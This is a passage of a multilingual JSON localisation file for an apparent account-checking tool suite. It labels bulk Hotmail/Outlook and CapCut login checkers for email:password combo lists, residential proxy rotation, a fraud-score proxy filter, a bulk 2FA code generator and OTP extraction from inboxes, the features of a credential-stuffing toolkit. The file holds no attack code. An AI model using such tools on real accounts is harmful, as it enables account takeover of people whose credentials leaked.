<code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, atau <code>scheme://...</code>", "prx_input_label": "INPUT PROXY LIST", "prx_btn_sample": "Sample", "prx_btn_clear": "Clear", "prx_input_ph": "Contoh format:\\n192.168.1.1:8080\\n192.168.1.1:8080:username:password\\nusername:password:192.168.1.1:8080\\nhttp://user:pass@192.168.1.1:8080", "prx_threads_label": "THREADS", "prx_timeout_label": "TIMEOUT (s)", "prx_scamalytics_toggle": "Scamalytics Fraud Score Check", "prx_btn_start": "Start Checking", "prx_btn_stop": "Stop", "prx_stat_total": "TOTAL", "prx_stat_live": "LIVE", "prx_stat_dead": "DEAD", "prx_stat_latency": "AVG LATENCY", "prx_stat_clean": "LOW FRAUD (<25)", "prx_filter_all": "All", "prx_filter_live": "Live", "prx_filter_dead": "Dead", "prx_filter_clean": "Low Fraud", "prx_search_ph": "Cari IP / Negara...", "prx_btn_export": "Export", "prx_exp_live_raw": "Copy Live (Original Format)", "prx_exp_live_ipport": "Copy Live (HOST:PORT)", "prx_exp_live_txt": "Download Live (.TXT)", "prx_exp_report_json": "Download Full Report (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "STATUS", "prx_th_ping": "PING", "prx_th_loc": "EXIT IP & LOCATION", "prx_th_isp": "ISP / ORG", "prx_th_fraud": "FRAUD RISK", "prx_th_act": "ACT", "prx_empty_table": "Belum ada proxy yang diperiksa. Masukkan list proxy dan klik <b>Start Checking</b>.", "prx_no_match": "Tidak ada proxy yang cocok dengan filter atau pencarian.", "prx_modal_title": "Proxy Diagnostic Details", "prx_modal_close": "Tutup", "prx_alert_empty": "Silakan masukkan list proxy!", "prx_no_live_copy": "Tidak ada proxy LIVE untuk disalin.", "prx_no_live_dl": "Tidak ada proxy LIVE untuk diunduh.", "nav_menu": "Menu", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Cek validitas login akun Microsoft (Hotmail / Outlook / Live) format email:password atau email|password & deteksi Negara/Lokasi.", "hm_acc_label": "DAFTAR AKUN (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Gunakan Proxy (Disarankan)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Mulai Check Hotmail", "hm_btn_stop": "Stop", "hm_results_title": "Hasil Pengecekan Hotmail", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "Akun LIVE (berhasil login + negara) akan muncul di sini...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "Akun DIE (salah password / tidak ada) akan muncul di sini...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Silakan masukkan list akun Hotmail/Outlook!", "hm_alert_no_valid": "Tidak ada baris akun format email:pass yang valid."}, "en": {"brand_sub": "MULTI TOOLS • SOCIAL MEDIA SUITE", "tab_mail": "Mail Reader", "tab_capcut": "CapCut Checker", "tab_2fa": "2FA Generator", "tab_proxy": "Proxy Checker", "tm_accounts_title": "Accounts", "tm_clear_all_title": "Clear All Accounts", "tm_search_acc_ph": "Search account email...", "tm_upload_txt": "Upload .TXT", "tm_upload_txt_title": "Upload .TXT File (Bulk Auto-read)", "tm_add_btn": "Add", "tm_add_btn_title": "Add Account Manually", "tm_mode_search": "Mode: Search Email", "tm_mode_all": "Mode: All Accounts", "tm_show_all": "Show All", "tm_search_only": "Search Only Mode", "tm_empty_acc_msg": "No accounts yet.<br>Upload a <b>.TXT</b> file or click <b>Add</b>.", "tm_inbox_title": "INBOX", "tm_btn_accounts": "Accounts", "tm_filter_msg_ph": "Filter sender / subject...", "tm_empty_inbox_select": "Select an account on the left to view inbox messages.", "tm_active_email_placeholder": "Select Account", "tm_badge_standby": "● Standby", "tm_badge_connected": "● Connected", "tm_badge_disconnected": "● Disconnected", "tm_btn_copy": "Copy", "tm_no_email_selected": "No email selected", "tm_click_inbox_hint": "Click an email from the inbox list to read its contents.", "tm_otp_detected": "VERIFICATION CODE / OTP DETECTED", "tm_btn_copy_otp": "Copy OTP", "tm_copied": "Copied!", "tm_search_another_title": "Search Another Account", "tm_search_another_desc": "Type an email in the search box above to pick an account.", "tm_accounts_avail": "Accounts Available", "tm_inbox_empty": "Inbox is empty.", "tm_no_msg_filter": "No messages match your filter.", "tm_no_acc_match": "No accounts matching", "tm_delete_acc_confirm": "Delete {email} from list?", "tm_clear_all_confirm": "Clear all Mail Checker accounts?", "tm_extracting": "Extracting & verifying accounts...", "tm_modal_add_title": "Add Outlook / Hotmail Accounts", "tm_modal_upload_label": "UPLOAD .TXT FILE (Bulk Import)", "tm_modal_paste_label": "OR PASTE TOKENS (email|pass|refresh_token|client_id or token only)", "tm_modal_proxy_label": "PROXY (Optional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Leave blank if direct connection", "tm_modal_btn_cancel": "Cancel", "tm_modal_btn_import": "Import & Check", "cc_card_title": "CapCut Account Input", "cc_acc_label": "ACCOUNT LIST (email:pass, email|pass, etc)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "RESIDENTIAL PROXY URL (Required)", "cc_proxy_help": "Use token <code>{sess}</code> for automatic IP rotation.", "cc_threads_label": "THREADS", "cc_retries_label": "IP RETRIES", "cc_btn_start": "Start CapCut Check", "cc_btn_stop": "Stop", "cc_results_title": "CapCut Check Results", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "PRO accounts will appear here...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "FREE accounts will appear here...", "cc_dead_title": "DEAD / ERROR", "cc_dead_ph": "Failed accounts will appear here...", "cc_btn_copy": "Copy", "cc_btn_save": "Save", "cc_alert_empty": "Please enter CapCut account list!", "cc_alert_no_valid": "No valid accounts found!", "tfa_single_title": "Quick 2FA Code (Single)", "tfa_single_desc": "Enter a 2FA Secret Key (Base32) to generate instant 6-digit verification codes.", "tfa_single_label": "2FA SECRET KEY", "tfa_single_ph": "Example: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Get Code", "tfa_auth_code_label": "AUTHENTICATOR CODE", "tfa_btn_copy_code": "Copy Code", "tfa_bulk_title": "Bulk 2FA Generator", "tfa_bulk_desc": "Supports pasting multiple Secret Keys or combo lines (format <code>email|pass|secret</code> or secret per line).", "tfa_bulk_label": "INPUT LIST SECRETS / COMBOS", "tfa_bulk_ph": "Example format:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...\\nHXDMVJZTGNCDESRR...", "tfa_btn_gen_all": "Generate All Codes", "tfa_bulk_res_label": "RESULTS (COMBO + 2FA CODE FORMAT)", "tfa_bulk_res_ph": "Generated 2FA codes will appear here...", "tfa_alert_empty_single": "Please enter a 2FA Secret Key!", "tfa_alert_empty_bulk": "Please enter secret list or combo lines!", "tfa_processing": "Processing...", "prx_title": "Proxy Checker", "prx_desc": "Supported formats: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, or <code>scheme://...</code>", "prx_input_label": "INPUT PROXY LIST", "prx_btn_sample": "Sample", "prx_btn_clear": "Clear", "prx_input_ph": "Example format:\\n192.168.1.1:8080\\n192.168.1.1:8080:username:password\\nusername:password:192.168.1.1:8080\\nhttp://user:pass@192.168.1.1:8080", "prx_threads_label": "THREADS", "prx_timeout_label": "TIMEOUT (s)", "prx_scamalytics_toggle": "Scamalytics Fraud Score Check", "prx_btn_start": "Start Checking", "prx_btn_stop": "Stop", "prx_stat_total": "TOTAL", "prx_stat_live": "LIVE", "prx_stat_dead": "DEAD", "prx_stat_latency": "AVG LATENCY", "prx_stat_clean": "LOW FRAUD (<25)", "prx_filter_all": "All", "prx_filter_live": "Live", "prx_filter_dead": "Dead", "prx_filter_clean": "Low Fraud", "prx_search_ph": "Search IP / Country...", "prx_btn_export": "Export", "prx_exp_live_raw": "Copy Live (Original Format)", "prx_exp_live_ipport": "Copy Live (HOST:PORT)", "prx_exp_live_txt": "Download Live (.TXT)", "prx_exp_report_json": "Download Full Report (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "STATUS", "prx_th_ping": "PING", "prx_th_loc": "EXIT IP & LOCATION", "prx_th_isp": "ISP / ORG", "prx_th_fraud": "FRAUD RISK", "prx_th_act": "ACT", "prx_empty_table": "No proxies checked yet. Enter proxy list and click <b>Start Checking</b>.", "prx_no_match": "No proxies match your search or filter.", "prx_modal_title": "Proxy Diagnostic Details", "prx_modal_close": "Close", "prx_alert_empty": "Please enter a proxy list!", "prx_no_live_copy": "No LIVE proxies to copy.", "prx_no_live_dl": "No LIVE proxies to download.", "nav_menu": "Menu", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}, "vi": {"brand_sub": "ĐA CÔNG CỤ • DỊCH VỤ MẠNG XÃ HỘI", "tab_mail": "Kiểm Tra Mail", "tab_capcut": "Kiểm Tra CapCut", "tab_2fa": "Tạo Mã 2FA", "tab_proxy": "Kiểm Tra Proxy", "tm_accounts_title": "Tài Khoản", "tm_clear_all_title": "Xóa Tất Cả Tài Khoản", "tm_search_acc_ph": "Tìm kiếm email tài khoản...", "tm_upload_txt": "Tải Lên .TXT", "tm_upload_txt_title": "Tải Tệp .TXT (Nhập Tự Động Hàng Loạt)", "tm_add_btn": "Thêm", "tm_add_btn_title": "Thêm Tài Khoản Thủ Công", "tm_mode_search": "Chế độ: Tìm Email", "tm_mode_all": "Chế độ: Tất Cả", "tm_show_all": "Hiện Tất Cả", "tm_search_only": "Chỉ Tìm Kiếm", "tm_empty_acc_msg": "Chưa có tài khoản.<br>Tải lên tệp <b>.TXT</b> hoặc bấm <b>Thêm</b>.", "tm_inbox_title": "HỘP THƯ ĐẾN", "tm_btn_accounts": "Tài Khoản", "tm_filter_msg_ph": "Lọc người gửi / tiêu đề...", "tm_empty_inbox_select": "Chọn một tài khoản ở bên trái để xem tin nhắn.", "tm_active_email_placeholder": "Chọn Tài Khoản", "tm_badge_standby": "● Chờ", "tm_badge_connected": "● Đã Kết Nối", "tm_badge_disconnected": "● Ngắt Kết Nối", "tm_btn_copy": "Sao Chép", "tm_no_email_selected": "Chưa chọn thư nào", "tm_click_inbox_hint": "Bấm vào một thư trong danh sách để đọc nội dung.", "tm_otp_detected": "PHÁT HIỆN MÃ XÁC THỰC / OTP", "tm_btn_copy_otp": "Sao Chép OTP", "tm_copied": "Đã sao chép!", "tm_search_another_title": "Tìm Tài Khoản Khác", "tm_search_another_desc": "Gõ email vào ô tìm kiếm phía trên để chọn tài khoản.", "tm_accounts_avail": "Tài Khoản Khả Dụng", "tm_inbox_empty": "Hộp thư rỗng.", "tm_no_msg_filter": "Không có thư nào khớp bộ lọc.", "tm_no_acc_match": "Không tìm thấy tài khoản", "tm_delete_acc_confirm": "Xóa {email} khỏi danh sách?", "tm_clear_all_confirm": "Xóa toàn bộ tài khoản Mail Checker?", "tm_extracting": "Đang trích xuất & kiểm tra...", "tm_modal_add_title": "Thêm Tài Khoản Outlook / Hotmail", "tm_modal_upload_label": "TẢI TỆP .TXT (Nhập Hàng Loạt)", "tm_modal_paste_label": "HOẶC DÁN TOKEN (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "PROXY (Tùy chọn: http://user:pass@host:port)", "tm_modal_proxy_ph": "Để trống nếu kết nối trực tiếp", "tm_modal_btn_cancel": "Hủy", "tm_modal_btn_import": "Nhập & Kiểm Tra", "cc_card_title": "Nhập Tài Khoản CapCut", "cc_acc_label": "DANH SÁCH (email:pass, email|pass,...)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL PROXY RESIDENTIAL (Bắt buộc)", "cc_proxy_help": "Dùng <code>{sess}</code> để tự động xoay IP.", "cc_threads_label": "LUỒNG", "cc_retries_label": "THỬ LẠI IP", "cc_btn_start": "Bắt Đầu Check CapCut", "cc_btn_stop": "Dừng", "cc_results_title": "Kết Quả Check CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Tài khoản PRO sẽ hiển thị ở đây...", "cc_free_title": "FREE / THƯỜNG", "cc_free_ph": "Tài khoản FREE sẽ hiển thị ở đây...", "cc_dead_title": "DEAD / LỖI", "cc_dead_ph": "Tài khoản lỗi sẽ hiển thị ở đây...", "cc_btn_copy": "Sao Chép", "cc_btn_save": "Lưu", "cc_alert_empty": "Vui lòng nhập danh sách tài khoản CapCut!", "cc_alert_no_valid": "Không tìm thấy tài khoản hợp lệ!", "tfa_single_title": "Mã 2FA Nhanh (Đơn)", "tfa_single_desc": "Nhập 2FA Secret Key (Base32) để nhận mã xác minh 6 số tức thì.", "tfa_single_label": "2FA SECRET KEY", "tfa_single_ph": "Ví dụ: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Lấy Mã", "tfa_auth_code_label": "MÃ XÁC THỰC", "tfa_btn_copy_code": "Sao Chép Mã", "tfa_bulk_title": "Tạo 2FA Hàng Loạt", "tfa_bulk_desc": "Hỗ trợ dán nhiều Secret Key hoặc dòng combo (định dạng <code>email|pass|secret</code> hoặc secret mỗi dòng).", "tfa_bulk_label": "NHẬP DANH SÁCH SECRETS / COMBOS", "tfa_bulk_ph": "Ví dụ:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Tạo Tất Cả Mã", "tfa_bulk_res_label": "KẾT QUẢ (COMBO + MÃ 2FA)", "tfa_bulk_res_ph": "Mã 2FA sẽ xuất hiện tại đây...", "tfa_alert_empty_single": "Vui lòng nhập Secret Key 2FA!", "tfa_alert_empty_bulk": "Vui lòng nhập danh sách secret/combo!", "tfa_processing": "Đang xử lý...", "prx_title": "Kiểm Tra Proxy", "prx_desc": "Hỗ trợ: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, hoặc <code>scheme://...</code>", "prx_input_label": "DANH SÁCH PROXY", "prx_btn_sample": "Mẫu", "prx_btn_clear": "Xóa", "prx_input_ph": "Ví dụ:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "LUỒNG", "prx_timeout_label": "THỜI GIAN CHỜ (s)", "prx_scamalytics_toggle": "Kiểm Tra Điểm Gian Lận Scamalytics", "prx_btn_start": "Bắt Đầu Kiểm Tra", "prx_btn_stop": "Dừng", "prx_stat_total": "TỔNG SỐ", "prx_stat_live": "SỐNG (LIVE)", "prx_stat_dead": "CHẾT (DEAD)", "prx_stat_latency": "ĐỘ TRỄ TB", "prx_stat_clean": "RỦI RO THẤP (<25)", "prx_filter_all": "Tất Cả", "prx_filter_live": "Sống", "prx_filter_dead": "Chết", "prx_filter_clean": "Sạch (Low Fraud)", "prx_search_ph": "Tìm IP / Quốc gia...", "prx_btn_export": "Xuất Dữ Liệu", "prx_exp_live_raw": "Sao Chép Live (Định Dạng Gốc)", "prx_exp_live_ipport": "Sao Chép Live (HOST:PORT)", "prx_exp_live_txt": "Tải Xuống Live (.TXT)", "prx_exp_report_json": "Tải Báo Cáo Đầy Đủ (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "TRẠNG THÁI", "prx_th_ping": "PING", "prx_th_loc": "IP THOÁT & VỊ TRÍ", "prx_th_isp": "NHÀ MẠNG / TỔ CHỨC", "prx_th_fraud": "ĐIỂM RỦI RO", "prx_th_act": "CHI TIẾT", "prx_empty_table": "Chưa kiểm tra proxy nào. Nhập danh sách và bấm <b>Bắt Đầu Kiểm Tra</b>.", "prx_no_match": "Không có proxy nào khớp bộ lọc.", "prx_modal_title": "Chi Tiết Chẩn Đoán Proxy", "prx_modal_close": "Đóng", "prx_alert_empty": "Vui lòng nhập danh sách proxy!", "prx_no_live_copy": "Không có proxy LIVE nào để sao chép.", "prx_no_live_dl": "Không có proxy LIVE nào để tải về.", "nav_menu": "Menu", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}, "zh": {"brand_sub": "多功能工具箱 • 社交媒体服务", "tab_mail": "邮箱检测器", "tab_capcut": "CapCut检测器", "tab_2fa": "2FA生成器", "tab_proxy": "代理检测器", "tm_accounts_title": "账号列表", "tm_clear_all_title": "清空所有账号", "tm_search_acc_ph": "搜索账号邮箱...", "tm_upload_txt": "上传 .TXT", "tm_upload_txt_title": "上传 .TXT 文件 (批量自动读取)", "tm_add_btn": "添加", "tm_add_btn_title": "手动添加账号", "tm_mode_search": "模式: 搜索邮箱", "tm_mode_all": "模式: 全部账号", "tm_show_all": "显示全部", "tm_search_only": "仅搜索模式", "tm_empty_acc_msg": "暂无账号。<br>上传 <b>.TXT</b> 文件或点击 <b>添加</b>。", "tm_inbox_title": "收件箱", "tm_btn_accounts": "账号", "tm_filter_msg_ph": "过滤发件人 / 主题...", "tm_empty_inbox_select": "请在左侧选择账号以查看收件箱消息。", "tm_active_email_placeholder": "选择账号", "tm_badge_standby": "● 待命", "tm_badge_connected": "● 已连接", "tm_badge_disconnected": "● 已断开", "tm_btn_copy": "复制", "tm_no_email_selected": "未选择邮件", "tm_click_inbox_hint": "点击收件箱列表中的邮件以阅读详细内容。", "tm_otp_detected": "已检测到验证码 / OTP", "tm_btn_copy_otp": "复制验证码", "tm_copied": "已复制!", "tm_search_another_title": "搜索其他账号", "tm_search_another_desc": "在上方搜索框输入邮箱以选取账号。", "tm_accounts_avail": "个可用账号", "tm_inbox_empty": "收件箱为空。", "tm_no_msg_filter": "没有符合过滤条件的消息。", "tm_no_acc_match": "未找到匹配账号", "tm_delete_acc_confirm": "确定从列表中删除 {email} 吗？", "tm_clear_all_confirm": "确定清空所有邮箱检测账号吗？", "tm_extracting": "正在提取并检测账号...", "tm_modal_add_title": "添加 Outlook / Hotmail 账号", "tm_modal_upload_label": "上传 .TXT 文件 (批量导入)", "tm_modal_paste_label": "或粘贴令牌 (email|pass|refresh_token|client_id 或仅token)", "tm_modal_proxy_label": "代理 (可选: http://user:pass@host:port)", "tm_modal_proxy_ph": "直接连接请留空", "tm_modal_btn_cancel": "取消", "tm_modal_btn_import": "导入并检测", "cc_card_title": "输入 CapCut 账号", "cc_acc_label": "账号列表 (email:pass, email|pass 等)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "住宅代理 URL (必填)", "cc_proxy_help": "使用 <code>{sess}</code> 变量实现自动轮换 IP。", "cc_threads_label": "线程数", "cc_retries_label": "IP重试次数", "cc_btn_start": "开始检测 CapCut", "cc_btn_stop": "停止", "cc_results_title": "CapCut 检测结果", "cc_pro_title": "PRO / VIP 会员", "cc_pro_ph": "PRO 账号将在此显示...", "cc_free_title": "FREE / 普通账号", "cc_free_ph": "FREE 账号将在此显示...", "cc_dead_title": "DEAD / 错误账号", "cc_dead_ph": "失败账号将在此显示...", "cc_btn_copy": "复制", "cc_btn_save": "保存", "cc_alert_empty": "请输入 CapCut 账号列表！", "cc_alert_no_valid": "未找到有效账号！", "tfa_single_title": "快捷 2FA 验证码 (单条)", "tfa_single_desc": "输入 2FA Secret Key (Base32) 即刻生成6位动态验证码。", "tfa_single_label": "2FA 密钥 (SECRET KEY)", "tfa_single_ph": "示例: JBSWY3DPEHPK3PXP", "tfa_btn_get": "获取验证码", "tfa_auth_code_label": "动态验证码", "tfa_btn_copy_code": "复制代码", "tfa_bulk_title": "批量 2FA 生成器", "tfa_bulk_desc": "支持批量粘贴密钥或组合行 (格式: <code>email|pass|secret</code> 或每行一个密钥)。", "tfa_bulk_label": "输入密钥列表 / 组合数据", "tfa_bulk_ph": "示例格式:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "批量生成所有验证码", "tfa_bulk_res_label": "生成结果 (组合格式 + 2FA 码)", "tfa_bulk_res_ph": "2FA 结果将在此显示...", "tfa_alert_empty_single": "请输入 2FA 密钥！", "tfa_alert_empty_bulk": "请输入密钥列表或组合数据！", "tfa_processing": "处理中...", "prx_title": "代理检测器", "prx_desc": "支持格式: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, 或 <code>scheme://...</code>", "prx_input_label": "输入代理列表", "prx_btn_sample": "示例", "prx_btn_clear": "清空", "prx_input_ph": "示例格式:\\n192.168.1.1:8080\\n192.168.1.1:8080:username:password", "prx_threads_label": "并发线程", "prx_timeout_label": "超时时间 (秒)", "prx_scamalytics_toggle": "Scamalytics 欺诈风险深度检测", "prx_btn_start": "开始检测", "prx_btn_stop": "停止", "prx_stat_total": "总数", "prx_stat_live": "存活 (LIVE)", "prx_stat_dead": "失效 (DEAD)", "prx_stat_latency": "平均延迟", "prx_stat_clean": "低风险 (<25)", "prx_filter_all": "全部", "prx_filter_live": "存活", "prx_filter_dead": "失效", "prx_filter_clean": "纯净 (低风险)", "prx_search_ph": "搜索 IP / 国家...", "prx_btn_export": "导出数据", "prx_exp_live_raw": "复制存活 (原始格式)", "prx_exp_live_ipport": "复制存活 (HOST:PORT)", "prx_exp_live_txt": "下载存活 (.TXT)", "prx_exp_report_json": "下载完整报告 (.JSON)", "prx_th_proxy": "代理地址", "prx_th_status": "状态", "prx_th_ping": "延迟", "prx_th_loc": "出口IP与归属地", "prx_th_isp": "运营商 / 组织", "prx_th_fraud": "欺诈评分", "prx_th_act": "详情", "prx_empty_table": "尚未检测任何代理。输入代理列表并点击 <b>开始检测</b>。", "prx_no_match": "没有匹配的代理数据。", "prx_modal_title": "代理诊断详情", "prx_modal_close": "关闭", "prx_alert_empty": "请输入代理列表！", "prx_no_live_copy": "没有存活的代理可供复制。", "prx_no_live_dl": "没有存活的代理可供下载。", "nav_menu": "菜单 (Menu)", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}, "ru": {"brand_sub": "МУЛЬТИ-ИНСТРУМЕНТЫ • SMM СЕРВИС", "tab_mail": "Чекер Почты", "tab_capcut": "Чекер CapCut", "tab_2fa": "Генератор 2FA", "tab_proxy": "Чекер Прокси", "tm_accounts_title": "Аккаунты", "tm_clear_all_title": "Удалить все аккаунты", "tm_search_acc_ph": "Поиск email аккаунта...", "tm_upload_txt": "Загрузить .TXT", "tm_upload_txt_title": "Загрузить файл .TXT (Массовый импорт)", "tm_add_btn": "Добавить", "tm_add_btn_title": "Добавить аккаунт вручную", "tm_mode_search": "Режим: Поиск Email", "tm_mode_all": "Режим: Все Аккаунты", "tm_show_all": "Показать все", "tm_search_only": "Только поиск", "tm_empty_acc_msg": "Нет аккаунтов.<br>Загрузите файл <b>.TXT</b> или нажмите <b>Добавить</b>.", "tm_inbox_title": "ВХОДЯЩИЕ", "tm_btn_accounts": "Аккаунты", "tm_filter_msg_ph": "Фильтр отправителя / темы...", "tm_empty_inbox_select": "Выберите аккаунт слева для просмотра входящих сообщений.", "tm_active_email_placeholder": "Выберите аккаунт", "tm_badge_standby": "● Ожидание", "tm_badge_connected": "● Подключено", "tm_badge_disconnected": "● Отключено", "tm_btn_copy": "Копировать", "tm_no_email_selected": "Письмо не выбрано", "tm_click_inbox_hint": "Нажмите на письмо в списке входящих, чтобы прочитать его.", "tm_otp_detected": "ОБНАРУЖЕН КОД ПОДТВЕРЖДЕНИЯ / OTP", "tm_btn_copy_otp": "Скопировать OTP", "tm_copied": "Скопировано!", "tm_search_another_title": "Найти другой аккаунт", "tm_search_another_desc": "Введите email в строке поиска выше, чтобы выбрать аккаунт.", "tm_accounts_avail": "Доступно аккаунтов", "tm_inbox_empty": "Входящие пусты.", "tm_no_msg_filter": "Нет сообщений, соответствующих фильтру.", "tm_no_acc_match": "Аккаунты не найдены", "tm_delete_acc_confirm": "Удалить {email} из списка?", "tm_clear_all_confirm": "Очистить все аккаунты чекера почты?", "tm_extracting": "Извлечение и проверка аккаунтов...", "tm_modal_add_title": "Добавить аккаунты Outlook / Hotmail", "tm_modal_upload_label": "ЗАГРУЗИТЬ ФАЙЛ .TXT (Массовый импорт)", "tm_modal_paste_label": "ИЛИ ВСТАВИТЬ ТОКЕНЫ (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "ПРОКСИ (Опционально: http://user:pass@host:port)", "tm_modal_proxy_ph": "Оставьте пустым для прямого соединения", "tm_modal_btn_cancel": "Отмена", "tm_modal_btn_import": "Импорт и проверка", "cc_card_title": "Ввод аккаунтов CapCut", "cc_acc_label": "СПИСОК АККАУНТОВ (email:pass, email|pass и т.д.)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL РЕЗИДЕНТСКИХ ПРОКСИ (Обязательно)", "cc_proxy_help": "Используйте <code>{sess}</code> для авто-ротации IP.", "cc_threads_label": "ПОТОКИ", "cc_retries_label": "ПОВТОРЫ IP", "cc_btn_start": "Начать проверку CapCut", "cc_btn_stop": "Стоп", "cc_results_title": "Результаты проверки CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "PRO аккаунты появятся здесь...", "cc_free_title": "FREE / ОБЫЧНЫЕ", "cc_free_ph": "FREE аккаунты появятся здесь...", "cc_dead_title": "DEAD / ОШИБКА", "cc_dead_ph": "Невалидные аккаунты появятся здесь...", "cc_btn_copy": "Копировать", "cc_btn_save": "Сохранить", "cc_alert_empty": "Пожалуйста, введите список аккаунтов CapCut!", "cc_alert_no_valid": "Валидные аккаунты не найдены!", "tfa_single_title": "Быстрый 2FA код (Одиночный)", "tfa_single_desc": "Введите 2FA Secret Key (Base32) для мгновенной генерации 6-значного кода.", "tfa_single_label": "СЕКРЕТНЫЙ КЛЮЧ 2FA", "tfa_single_ph": "Пример: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Получить код", "tfa_auth_code_label": "КОД АУТЕНТИФИКАЦИИ", "tfa_btn_copy_code": "Скопировать код", "tfa_bulk_title": "Массовый генератор 2FA", "tfa_bulk_desc": "Поддерживает вставку нескольких ключей или combo строк (формат <code>email|pass|secret</code>).", "tfa_bulk_label": "СПИСОК КЛЮЧЕЙ / COMBO", "tfa_bulk_ph": "Пример:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Сгенерировать все коды", "tfa_bulk_res_label": "РЕЗУЛЬТАТ (ФОРМАТ COMBO + 2FA КОД)", "tfa_bulk_res_ph": "Результаты 2FA появятся здесь...", "tfa_alert_empty_single": "Пожалуйста, введите секретный ключ 2FA!", "tfa_alert_empty_bulk": "Пожалуйста, введите список ключей или combo строк!", "tfa_processing": "Обработка...", "prx_title": "Чекер Прокси", "prx_desc": "Форматы: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, или <code>scheme://...</code>", "prx_input_label": "СПИСОК 